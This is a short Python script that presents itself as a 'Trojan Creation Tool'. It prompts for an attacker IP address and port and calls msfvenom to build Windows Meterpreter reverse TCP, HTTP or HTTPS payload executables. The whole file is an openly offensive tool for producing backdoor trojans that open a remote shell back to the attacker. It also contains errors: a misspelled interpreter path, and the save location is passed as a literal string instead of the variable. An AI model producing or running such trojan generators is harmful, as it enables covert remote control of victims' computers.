#!/usr/bin/env pyton
import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Create Trojan")

print("""

Welcome to the Trojan Creation Tool, Good Luck :D

""")

ip = raw_input("Enter Local or External IP: ")
port = raw_input("Enter Port: ")

print("""

1) windows/meterpreter/reverse_tcp

2) windows/meterpreter/reverse_http

3) windows/meterpreter/reverse_https

""")

payload = raw_input("Enter Payload Number: ")
saveloc = raw_input("Enter Save Location: ")

if(payload=="1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o saveloc")
elif(payload=="2"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o saveloc")
elif(payload=="3"):
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o saveloc")







